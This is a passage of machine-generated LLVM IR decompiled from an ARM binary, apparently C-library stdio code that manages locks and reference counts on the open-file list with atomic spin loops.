  store i32 %v3_aff4, i32* %r3.global-to-local, align 4
  %v0_aff8 = call i32 @__aeabi_read_tp()
  store i32 %v0_aff8, i32* %r0.global-to-local, align 4
  %v1_affc = add i32 %v0_aff8, -1168
  store i32 %v1_affc, i32* %sl.global-to-local, align 4
  %v0_b000 = load i32, i32* %r3.global-to-local, align 4
  %v3_b000 = icmp uge i32 %v0_b000, %v1_affc
  store i1 %v3_b000, i1* %cpsr_c.global-to-local, align 1
  %v9_b000 = icmp eq i32 %v0_b000, %v1_affc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_b008 = load i32, i32* @r5, align 4
  %v2_b008 = add i32 %v1_b008, 4
  %v3_b008 = inttoptr i32 %v2_b008 to i32*
  store i32 -1, i32* %v3_b008, align 4
  br i1 %v9_b000, label %dec_label_pc_b050, label %dec_label_pc_b010

dec_label_pc_b010:                                ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_b014 = load i32, i32* @r7, align 4
  store i32 %v0_b014, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_b01c108 = inttoptr i32 %v0_b014 to i32*
  %v2_b01c109 = load i32, i32* %v1_b01c108, align 4
  store i32 %v2_b01c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_b020111 = icmp eq i32 %v2_b01c109, 0
  br i1 %v9_b020111, label %dec_label_pc_b028, label %dec_label_pc_b040

dec_label_pc_b028:                                ; preds = %dec_label_pc_b010, %dec_label_pc_b028.dec_label_pc_b01c_crit_edge
  %v0_b028112 = phi i32 [ %v1_b020.pre, %dec_label_pc_b028.dec_label_pc_b01c_crit_edge ], [ 0, %dec_label_pc_b010 ]
  store i32 %v0_b028112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b038 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b038, label %dec_label_pc_b03c, label %dec_label_pc_b028.dec_label_pc_b01c_crit_edge

dec_label_pc_b028.dec_label_pc_b01c_crit_edge:    ; preds = %dec_label_pc_b028
  %v0_b01c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b020.pre = load i32, i32* @r4, align 4
  %v1_b01c = inttoptr i32 %v0_b01c.pre to i32*
  %v2_b01c = load i32, i32* %v1_b01c, align 4
  store i32 %v2_b01c, i32* %r3.global-to-local, align 4
  %v3_b020 = icmp uge i32 %v2_b01c, %v1_b020.pre
  store i1 %v3_b020, i1* %cpsr_c.global-to-local, align 1
  %v9_b020 = icmp eq i32 %v2_b01c, %v1_b020.pre
  br i1 %v9_b020, label %dec_label_pc_b028, label %dec_label_pc_b040

dec_label_pc_b03c:                                ; preds = %dec_label_pc_b028
  %v0_b03c = load i32, i32* @r4, align 4
  store i32 %v0_b03c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b040

dec_label_pc_b040:                                ; preds = %dec_label_pc_b010, %dec_label_pc_b028.dec_label_pc_b01c_crit_edge, %dec_label_pc_b03c
  %v0_b040 = phi i32 [ %v0_b03c, %dec_label_pc_b03c ], [ %v2_b01c109, %dec_label_pc_b010 ], [ %v2_b01c, %dec_label_pc_b028.dec_label_pc_b01c_crit_edge ]
  %v1_b040 = phi i32 [ %v0_b03c, %dec_label_pc_b03c ], [ 0, %dec_label_pc_b010 ], [ %v1_b020.pre, %dec_label_pc_b028.dec_label_pc_b01c_crit_edge ]
  %v3_b040 = icmp uge i32 %v0_b040, %v1_b040
  store i1 %v3_b040, i1* %cpsr_c.global-to-local, align 1
  %v9_b040 = icmp eq i32 %v0_b040, %v1_b040
  br i1 %v9_b040, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_b040
  %v1_b044 = load i32, i32* @r7, align 4
  store i32 %v1_b044, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_b040, %bb46
  %v1_b048 = xor i1 %v9_b040, true
  call void @__pseudo_cond_branch(i1 %v1_b048, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_b04c = load i32, i32* %sl.global-to-local, align 4
  %v1_b04c = load i32, i32* @r7, align 4
  %v2_b04c = add i32 %v1_b04c, 8
  %v3_b04c = inttoptr i32 %v2_b04c to i32*
  store i32 %v0_b04c, i32* %v3_b04c, align 4
  br label %dec_label_pc_b050

dec_label_pc_b050:                                ; preds = %bb45, %bb47
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b054 = load i32, i32* @r8, align 4
  %v2_b054 = add i32 %v0_b054, 168
  %v3_b054 = inttoptr i32 %v2_b054 to i32*
  %v4_b054 = load i32, i32* %v3_b054, align 4
  store i32 %v4_b054, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_b05c = add i32 %v0_b054, 12
  %v3_b05c = inttoptr i32 %v2_b05c to i32*
  %v4_b05c = load i32, i32* %v3_b05c, align 4
  store i32 %v4_b05c, i32* %r2.global-to-local, align 4
  %v1_b060 = add i32 %v4_b054, 4
  %v2_b060 = inttoptr i32 %v1_b060 to i32*
  %v3_b060 = load i32, i32* %v2_b060, align 4
  store i32 %v3_b060, i32* %r1.global-to-local, align 4
  %v1_b064 = inttoptr i32 %v4_b05c to i32*
  %v2_b064 = load i32, i32* %v1_b064, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b068 = icmp eq i32 %v3_b060, 0
  %v1_b06c = add i32 %v2_b064, 1
  store i32 %v1_b06c, i32* %r3.global-to-local, align 4
  store i32 %v1_b06c, i32* %v1_b064, align 4
  br i1 %v2_b068, label %dec_label_pc_b078, label %dec_label_pc_b0d8

dec_label_pc_b078:                                ; preds = %dec_label_pc_b050
  %v0_b078 = load i32, i32* %r1.global-to-local, align 4
  %v1_b078 = load i32, i32* %r0.global-to-local, align 4
  %v2_b078 = add i32 %v1_b078, 8
  %v3_b078 = inttoptr i32 %v2_b078 to i32*
  store i32 %v0_b078, i32* %v3_b078, align 4
  %v0_b07c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b07c, i32* @r7, align 4
  br label %dec_label_pc_b080

dec_label_pc_b080:                                ; preds = %dec_label_pc_b0b0.dec_label_pc_b080_crit_edge, %dec_label_pc_b078
  %v0_b080 = phi i32 [ %v0_b080.pre, %dec_label_pc_b0b0.dec_label_pc_b080_crit_edge ], [ %v0_b07c, %dec_label_pc_b078 ]
  %v1_b080 = inttoptr i32 %v0_b080 to i32*
  %v2_b080 = load i32, i32* %v1_b080, align 4
  store i32 %v2_b080, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_b080, i32* %r2.global-to-local, align 4
  %v2_b08c96 = load i32, i32* %v1_b080, align 4
  store i32 %v2_b08c96, i32* %r3.global-to-local, align 4
  %v3_b09098 = icmp uge i32 %v2_b08c96, %v2_b080
  store i1 %v3_b09098, i1* %cpsr_c.global-to-local, align 1
  %v9_b090104 = icmp eq i32 %v2_b08c96, %v2_b080
  br i1 %v9_b090104, label %dec_label_pc_b098, label %dec_label_pc_b0b0

dec_label_pc_b098:                                ; preds = %dec_label_pc_b080, %dec_label_pc_b098.dec_label_pc_b08c_crit_edge
  %v0_b098105 = phi i32 [ %v1_b090.pre, %dec_label_pc_b098.dec_label_pc_b08c_crit_edge ], [ %v2_b080, %dec_label_pc_b080 ]
  store i32 %v0_b098105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b0a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b0a8, label %dec_label_pc_b0ac, label %dec_label_pc_b098.dec_label_pc_b08c_crit_edge

dec_label_pc_b098.dec_label_pc_b08c_crit_edge:    ; preds = %dec_label_pc_b098
  %v0_b08c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b090.pre = load i32, i32* @r4, align 4
  %v1_b08c = inttoptr i32 %v0_b08c.pre to i32*
  %v2_b08c = load i32, i32* %v1_b08c, align 4
  store i32 %v2_b08c, i32* %r3.global-to-local, align 4
  %v3_b090 = icmp uge i32 %v2_b08c, %v1_b090.pre
  store i1 %v3_b090, i1* %cpsr_c.global-to-local, align 1
  %v9_b090 = icmp eq i32 %v2_b08c, %v1_b090.pre
  br i1 %v9_b090, label %dec_label_pc_b098, label %dec_label_pc_b0b0

dec_label_pc_b0ac:                                ; preds = %dec_label_pc_b098
  %v0_b0ac = load i32, i32* @r4, align 4
  store i32 %v0_b0ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b0b0

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b080, %dec_label_pc_b098.dec_label_pc_b08c_crit_edge, %dec_label_pc_b0ac
  %v0_b0b8 = phi i32 [ %v0_b0ac, %dec_label_pc_b0ac ], [ %v2_b08c96, %dec_label_pc_b080 ], [ %v2_b08c, %dec_label_pc_b098.dec_label_pc_b08c_crit_edge ]
  %v1_b0b0 = phi i32 [ %v0_b0ac, %dec_label_pc_b0ac ], [ %v2_b080, %dec_label_pc_b080 ], [ %v1_b090.pre, %dec_label_pc_b098.dec_label_pc_b08c_crit_edge ]
  %v3_b0b0 = icmp uge i32 %v0_b0b8, %v1_b0b0
  store i1 %v3_b0b0, i1* %cpsr_c.global-to-local, align 1
  %v9_b0b0 = icmp eq i32 %v0_b0b8, %v1_b0b0
  br i1 %v9_b0b0, label %dec_label_pc_b0b8, label %dec_label_pc_b0b0.dec_label_pc_b080_crit_edge

dec_label_pc_b0b0.dec_label_pc_b080_crit_edge:    ; preds = %dec_label_pc_b0b0
  %v0_b080.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b080

dec_label_pc_b0b8:                                ; preds = %dec_label_pc_b0b0
  %v2_b0b8 = icmp ne i32 %v1_b0b0, 0
  store i1 %v2_b0b8, i1* %cpsr_c.global-to-local, align 1
  %v7_b0bc = icmp slt i32 %v1_b0b0, 2
  br i1 %v7_b0bc, label %dec_label_pc_b0d8, label %dec_label_pc_b0c0

dec_label_pc_b0c0:                                ; preds = %dec_label_pc_b0b8
  %v0_b0c0 = load i32, i32* @r7, align 4
  store i32 %v0_b0c0, i32* %r0.global-to-local, align 4
  %v0_b0c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0c4 = add i32 %v0_b0c4, 129
  store i32 %v1_b0c4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b0d8

dec_label_pc_b0d8:                                ; preds = %dec_label_pc_b050, %dec_label_pc_b0c0, %dec_label_pc_b0b8
  %v0_b0d8 = load i32, i32* @r5, align 4
  %v1_b0d8 = inttoptr i32 %v0_b0d8 to i16*
  %v2_b0d8 = load i16, i16* %v1_b0d8, align 2
  %v3_b0d8 = zext i16 %v2_b0d8 to i32
  %v1_b0dc = and i32 %v3_b0d8, 24576
  %v1_b0e0 = or i32 %v1_b0dc, 48
  store i32 %v1_b0e0, i32* %r3.global-to-local, align 4
  %v0_b0e4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b0e4 = icmp eq i32 %v0_b0e4, 0
  %v1_b0e8 = trunc i32 %v1_b0e0 to i16
  store i16 %v1_b0e8, i16* %v1_b0d8, align 2
  br i1 %v2_b0e4, label %dec_label_pc_b0f0, label %dec_label_pc_b164

dec_label_pc_b0f0:                                ; preds = %dec_label_pc_b0d8
  %v0_b0f0 = load i32, i32* @r5, align 4
  %v1_b0f0 = add i32 %v0_b0f0, 60
  %v2_b0f0 = inttoptr i32 %v1_b0f0 to i32*
  %v3_b0f0 = load i32, i32* %v2_b0f0, align 4
  %v1_b0f4 = add i32 %v3_b0f0, -1
  store i32 %v1_b0f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b0f8 = icmp eq i32 %v1_b0f4, 0
  store i32 %v1_b0f4, i32* %v2_b0f0, align 4
  br i1 %v2_b0f8, label %dec_label_pc_b104, label %dec_label_pc_b164

dec_label_pc_b104:                                ; preds = %dec_label_pc_b0f0
  %v0_b104 = load i32, i32* %r3.global-to-local, align 4
  %v1_b104 = load i32, i32* @r5, align 4
  %v2_b104 = add i32 %v1_b104, 64
  %v3_b104 = inttoptr i32 %v2_b104 to i32*
  store i32 %v0_b104, i32* %v3_b104, align 4
  %v0_b108 = load i32, i32* @r5, align 4
  %v1_b108 = add i32 %v0_b108, 56
  store i32 %v1_b108, i32* @r6, align 4
  br label %dec_label_pc_b10c

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b13c.dec_label_pc_b10c_crit_edge, %dec_label_pc_b104
  %v0_b114 = phi i32 [ %v0_b114.pre, %dec_label_pc_b13c.dec_label_pc_b10c_crit_edge ], [ %v1_b108, %dec_label_pc_b104 ]
  %v0_b10c = phi i32 [ %v0_b10c.pre, %dec_label_pc_b13c.dec_label_pc_b10c_crit_edge ], [ %v0_b108, %dec_label_pc_b104 ]
  %v1_b10c = add i32 %v0_b10c, 56
  %v2_b10c = inttoptr i32 %v1_b10c to i32*
  %v3_b10c = load i32, i32* %v2_b10c, align 4
  store i32 %v3_b10c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_b114, i32* %r2.global-to-local, align 4
  %v1_b11882 = inttoptr i32 %v0_b114 to i32*
  %v2_b11883 = load i32, i32* %v1_b11882, align 4
  store i32 %v2_b11883, i32* %r3.global-to-local, align 4
  %v3_b11c85 = icmp uge i32 %v2_b11883, %v3_b10c
  store i1 %v3_b11c85, i1* %cpsr_c.global-to-local, align 1
  %v9_b11c91 = icmp eq i32 %v2_b11883, %v3_b10c
  br i1 %v9_b11c91, label %dec_label_pc_b124, label %dec_label_pc_b13c

dec_label_pc_b124:                                ; preds = %dec_label_pc_b10c, %dec_label_pc_b124.dec_label_pc_b118_crit_edge
  %v0_b12492 = phi i32 [ %v1_b11c.pre, %dec_label_pc_b124.dec_label_pc_b118_crit_edge ], [ %v3_b10c, %dec_label_pc_b10c ]
  store i32 %v0_b12492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b134 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b134, label %dec_label_pc_b138, label %dec_label_pc_b124.dec_label_pc_b118_crit_edge

dec_label_pc_b124.dec_label_pc_b118_crit_edge:    ; preds = %dec_label_pc_b124
  %v0_b118.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b11c.pre = load i32, i32* @r4, align 4
  %v1_b118 = inttoptr i32 %v0_b118.pre to i32*
  %v2_b118 = load i32, i32* %v1_b118, align 4
  store i32 %v2_b118, i32* %r3.global-to-local, align 4
  %v3_b11c = icmp uge i32 %v2_b118, %v1_b11c.pre
  store i1 %v3_b11c, i1* %cpsr_c.global-to-local, align 1
  %v9_b11c = icmp eq i32 %v2_b118, %v1_b11c.pre
  br i1 %v9_b11c, label %dec_label_pc_b124, label %dec_label_pc_b13c

dec_label_pc_b138:                                ; preds = %dec_label_pc_b124
  %v0_b138 = load i32, i32* @r4, align 4
  store i32 %v0_b138, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b13c

dec_label_pc_b13c:                                ; preds = %dec_label_pc_b10c, %dec_label_pc_b124.dec_label_pc_b118_crit_edge, %dec_label_pc_b138
  %v0_b144 = phi i32 [ %v0_b138, %dec_label_pc_b138 ], [ %v2_b11883, %dec_label_pc_b10c ], [ %v2_b118, %dec_label_pc_b124.dec_label_pc_b118_crit_edge ]
  %v1_b13c = phi i32 [ %v0_b138, %dec_label_pc_b138 ], [ %v3_b10c, %dec_label_pc_b10c ], [ %v1_b11c.pre, %dec_label_pc_b124.dec_label_pc_b118_crit_edge ]
  %v3_b13c = icmp uge i32 %v0_b144, %v1_b13c
  store i1 %v3_b13c, i1* %cpsr_c.global-to-local, align 1
  %v9_b13c = icmp eq i32 %v0_b144, %v1_b13c
  br i1 %v9_b13c, label %dec_label_pc_b144, label %dec_label_pc_b13c.dec_label_pc_b10c_crit_edge

dec_label_pc_b13c.dec_label_pc_b10c_crit_edge:    ; preds = %dec_label_pc_b13c
  %v0_b10c.pre = load i32, i32* @r5, align 4
  %v0_b114.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b10c

dec_label_pc_b144:                                ; preds = %dec_label_pc_b13c
  %v2_b144 = icmp ne i32 %v1_b13c, 0
  store i1 %v2_b144, i1* %cpsr_c.global-to-local, align 1
  %v7_b148 = icmp slt i32 %v1_b13c, 2
  br i1 %v7_b148, label %dec_label_pc_b164, label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b144
  %v0_b14c = load i32, i32* @r5, align 4
  %v1_b14c = add i32 %v0_b14c, 56
  store i32 %v1_b14c, i32* %r0.global-to-local, align 4
  %v0_b150 = load i32, i32* %r1.global-to-local, align 4
  %v1_b150 = add i32 %v0_b150, 129
  store i32 %v1_b150, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b164

dec_label_pc_b164:                                ; preds = %dec_label_pc_b0f0, %dec_label_pc_b0d8, %dec_label_pc_b14c, %dec_label_pc_b144
  %v0_b164 = load i32, i32* @r5, align 4
  %v1_b164 = inttoptr i32 %v0_b164 to i16*
  %v2_b164 = load i16, i16* %v1_b164, align 2
  %v3_b164 = zext i16 %v2_b164 to i32
  store i32 %v3_b164, i32* %r3.global-to-local, align 4
  %v1_b168 = and i32 %v3_b164, 16384
  %v2_b168 = icmp eq i32 %v1_b168, 0
  br i1 %v2_b168, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_b164
  %v2_b16c = add i32 %v0_b164, 8
  %v3_b16c = inttoptr i32 %v2_b16c to i32*
  %v4_b16c = load i32, i32* %v3_b16c, align 4
  store i32 %v4_b16c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_b164, %bb48
  %v1_b170 = xor i1 %v2_b168, true
  call void @__pseudo_cond_branch(i1 %v1_b170, i32 ptrtoint (i32* @global_var_f0a8.425 to i32))
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b178 = load i32, i32* @r8, align 4
  %v2_b178 = add i32 %v0_b178, 168
  %v3_b178 = inttoptr i32 %v2_b178 to i32*
  %v4_b178 = load i32, i32* %v3_b178, align 4
  store i32 %v4_b178, i32* @r5, align 4
  %v1_b17c = add i32 %v4_b178, 8
  %v2_b17c = inttoptr i32 %v1_b17c to i32*
  %v3_b17c = load i32, i32* %v2_b17c, align 4
  store i32 %v3_b17c, i32* %r3.global-to-local, align 4
  %v1_b180 = load i32, i32* %sl.global-to-local, align 4
  %v3_b180 = icmp uge i32 %v3_b17c, %v1_b180
  store i1 %v3_b180, i1* %cpsr_c.global-to-local, align 1
  %v9_b180 = icmp eq i32 %v3_b17c, %v1_b180
  br i1 %v9_b180, label %dec_label_pc_b1c8, label %dec_label_pc_b188

dec_label_pc_b188:                                ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_b178, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_b19475 = inttoptr i32 %v4_b178 to i32*
  %v2_b19476 = load i32, i32* %v1_b19475, align 4
  store i32 %v2_b19476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_b19878 = icmp eq i32 %v2_b19476, 0
  br i1 %v9_b19878, label %dec_label_pc_b1a0, label %dec_label_pc_b1b8

dec_label_pc_b1a0:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b1a0.dec_label_pc_b194_crit_edge
  %v0_b1a079 = phi i32 [ %v1_b198.pre, %dec_label_pc_b1a0.dec_label_pc_b194_crit_edge ], [ 0, %dec_label_pc_b188 ]
  store i32 %v0_b1a079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b1b0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b1b0, label %dec_label_pc_b1b4, label %dec_label_pc_b1a0.dec_label_pc_b194_crit_edge

dec_label_pc_b1a0.dec_label_pc_b194_crit_edge:    ; preds = %dec_label_pc_b1a0
  %v0_b194.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b198.pre = load i32, i32* @r4, align 4
  %v1_b194 = inttoptr i32 %v0_b194.pre to i32*
  %v2_b194 = load i32, i32* %v1_b194, align 4
  store i32 %v2_b194, i32* %r3.global-to-local, align 4
  %v3_b198 = icmp uge i32 %v2_b194, %v1_b198.pre
  store i1 %v3_b198, i1* %cpsr_c.global-to-local, align 1
  %v9_b198 = icmp eq i32 %v2_b194, %v1_b198.pre
  br i1 %v9_b198, label %dec_label_pc_b1a0, label %dec_label_pc_b1b8

dec_label_pc_b1b4:                                ; preds = %dec_label_pc_b1a0
  %v0_b1b4 = load i32, i32* @r4, align 4
  store i32 %v0_b1b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b1b8

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b1a0.dec_label_pc_b194_crit_edge, %dec_label_pc_b1b4
  %v0_b1b8 = phi i32 [ %v0_b1b4, %dec_label_pc_b1b4 ], [ %v2_b19476, %dec_label_pc_b188 ], [ %v2_b194, %dec_label_pc_b1a0.dec_label_pc_b194_crit_edge ]
  %v1_b1b8 = phi i32 [ %v0_b1b4, %dec_label_pc_b1b4 ], [ 0, %dec_label_pc_b188 ], [ %v1_b198.pre, %dec_label_pc_b1a0.dec_label_pc_b194_crit_edge ]
  %v3_b1b8 = icmp uge i32 %v0_b1b8, %v1_b1b8
  store i1 %v3_b1b8, i1* %cpsr_c.global-to-local, align 1
  %v9_b1b8 = icmp eq i32 %v0_b1b8, %v1_b1b8
  br i1 %v9_b1b8, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_b1b8
  %v1_b1bc = load i32, i32* @r5, align 4
  store i32 %v1_b1bc, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_b1b8, %bb50
  %v1_b1c0 = xor i1 %v9_b1b8, true
  call void @__pseudo_cond_branch(i1 %v1_b1c0, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_b1c4 = load i32, i32* %sl.global-to-local, align 4
  %v1_b1c4 = load i32, i32* @r5, align 4
  %v2_b1c4 = add i32 %v1_b1c4, 8
  %v3_b1c4 = inttoptr i32 %v2_b1c4 to i32*
  store i32 %v0_b1c4, i32* %v3_b1c4, align 4
  %v0_b1cc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b1c8

dec_label_pc_b1c8:                                ; preds = %bb49, %bb51
  %v0_b1cc = phi i32 [ %v0_b178, %bb49 ], [ %v0_b1cc.pre, %bb51 ]
  store i32 88, i32* %r3.global-to-local, align 4
  %v2_b1cc = add i32 %v0_b1cc, 88
  %v3_b1cc = inttoptr i32 %v2_b1cc to i32*
  %v4_b1cc = load i32, i32* %v3_b1cc, align 4
  store i32 %v4_b1cc, i32* %r2.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_b1d4 = add i32 %v0_b1cc, 168
  %v3_b1d4 = inttoptr i32 %v2_b1d4 to i32*
  %v4_b1d4 = load i32, i32* %v3_b1d4, align 4
  store i32 %v4_b1d4, i32* %r0.global-to-local, align 4
  %v1_b1d8 = inttoptr i32 %v4_b1cc to i32*
  %v2_b1d8 = load i32, i32* %v1_b1d8, align 4
  store i32 %v2_b1d8, i32* %r3.global-to-local, align 4
  %v1_b1dc = add i32 %v4_b1d4, 4
  %v2_b1dc = inttoptr i32 %v1_b1dc to i32*
  %v3_b1dc = load i32, i32* %v2_b1dc, align 4
  store i32 %v3_b1dc, i32* %r1.global-to-local, align 4
  %v1_b1e0 = add i32 %v2_b1d8, 1
  store i32 %v1_b1e0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b1e4 = icmp eq i32 %v3_b1dc, 0
  store i32 %v1_b1e0, i32* %v1_b1d8, align 4
  br i1 %v2_b1e4, label %dec_label_pc_b1f0, label %dec_label_pc_b250

dec_label_pc_b1f0:                                ; preds = %dec_label_pc_b1c8
  %v0_b1f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_b1f0 = add i32 %v1_b1f0, 8
  %v3_b1f0 = inttoptr i32 %v2_b1f0 to i32*
  store i32 %v0_b1f0, i32* %v3_b1f0, align 4
  %v0_b1f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b1f4, i32* @r5, align 4
  br label %dec_label_pc_b1f8

dec_label_pc_b1f8:                                ; preds = %dec_label_pc_b228.dec_label_pc_b1f8_crit_edge, %dec_label_pc_b1f0
  %v0_b1f8 = phi i32 [ %v0_b1f8.pre, %dec_label_pc_b228.dec_label_pc_b1f8_crit_edge ], [ %v0_b1f4, %dec_label_pc_b1f0 ]
  %v1_b1f8 = inttoptr i32 %v0_b1f8 to i32*
  %v2_b1f8 = load i32, i32* %v1_b1f8, align 4
  store i32 %v2_b1f8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_b1f8, i32* %r2.global-to-local, align 4
  %v2_b20464 = load i32, i32* %v1_b1f8, align 4
  store i32 %v2_b20464, i32* %r3.global-to-local, align 4
  %v3_b20866 = icmp uge i32 %v2_b20464, %v2_b1f8
  store i1 %v3_b20866, i1* %cpsr_c.global-to-local, align 1
  %v9_b20872 = icmp eq i32 %v2_b20464, %v2_b1f8
  br i1 %v9_b20872, label %dec_label_pc_b210, label %dec_label_pc_b228

dec_label_pc_b210:                                ; preds = %dec_label_pc_b1f8, %dec_label_pc_b210.dec_label_pc_b204_crit_edge
  %v0_b21073 = phi i32 [ %v1_b208.pre, %dec_label_pc_b210.dec_label_pc_b204_crit_edge ], [ %v2_b1f8, %dec_label_pc_b1f8 ]
  store i32 %v0_b21073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b220 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b220, label %dec_label_pc_b224, label %dec_label_pc_b210.dec_label_pc_b204_crit_edge

dec_label_pc_b210.dec_label_pc_b204_crit_edge:    ; preds = %dec_label_pc_b210
  %v0_b204.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b208.pre = load i32, i32* @r4, align 4
  %v1_b204 = inttoptr i32 %v0_b204.pre to i32*
  %v2_b204 = load i32, i32* %v1_b204, align 4
  store i32 %v2_b204, i32* %r3.global-to-local, align 4
  %v3_b208 = icmp uge i32 %v2_b204, %v1_b208.pre
  store i1 %v3_b208, i1* %cpsr_c.global-to-local, align 1
  %v9_b208 = icmp eq i32 %v2_b204, %v1_b208.pre
  br i1 %v9_b208, label %dec_label_pc_b210, label %dec_label_pc_b228

dec_label_pc_b224:                                ; preds = %dec_label_pc_b210
  %v0_b224 = load i32, i32* @r4, align 4
  store i32 %v0_b224, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b228

dec_label_pc_b228:                                ; preds = %dec_label_pc_b1f8, %dec_label_pc_b210.dec_label_pc_b204_crit_edge, %dec_label_pc_b224
  %v0_b230 = phi i32 [ %v0_b224, %dec_label_pc_b224 ], [ %v2_b20464, %dec_label_pc_b1f8 ], [ %v2_b204, %dec_label_pc_b210.dec_label_pc_b204_crit_edge ]
  %v1_b228 = phi i32 [ %v0_b224, %dec_label_pc_b224 ], [ %v2_b1f8, %dec_label_pc_b1f8 ], [ %v1_b208.pre, %dec_label_pc_b210.dec_label_pc_b204_crit_edge ]
  %v3_b228 = icmp uge i32 %v0_b230, %v1_b228
  store i1 %v3_b228, i1* %cpsr_c.global-to-local, align 1
  %v9_b228 = icmp eq i32 %v0_b230, %v1_b228
  br i1 %v9_b228, label %dec_label_pc_b230, label %dec_label_pc_b228.dec_label_pc_b1f8_crit_edge

dec_label_pc_b228.dec_label_pc_b1f8_crit_edge:    ; preds = %dec_label_pc_b228
  %v0_b1f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b1f8

dec_label_pc_b230:                                ; preds = %dec_label_pc_b228
  %v2_b230 = icmp ne i32 %v1_b228, 0
  store i1 %v2_b230, i1* %cpsr_c.global-to-local, align 1
  %v7_b234 = icmp slt i32 %v1_b228, 2
  br i1 %v7_b234, label %dec_label_pc_b250, label %dec_label_pc_b238

dec_label_pc_b238:                                ; preds = %dec_label_pc_b230
  %v0_b238 = load i32, i32* @r5, align 4
  store i32 %v0_b238, i32* %r0.global-to-local, align 4
  %v0_b23c = load i32, i32* %r1.global-to-local, align 4
  %v1_b23c = add i32 %v0_b23c, 129
  store i32 %v1_b23c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b250

dec_label_pc_b250:                                ; preds = %dec_label_pc_b1c8, %dec_label_pc_b238, %dec_label_pc_b230
  %v0_b250 = call i32 @_stdio_openlist_dec_use()
  %v0_b254 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b254, i32* %r0.global-to-local, align 4
  %v2_b25c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_b25c, i32* @r4, align 4
  store i32 %v6_af44, i32* @r5, align 4
  store i32 %v9_af44, i32* @r6, align 4
  store i32 %v12_af44, i32* @r7, align 4
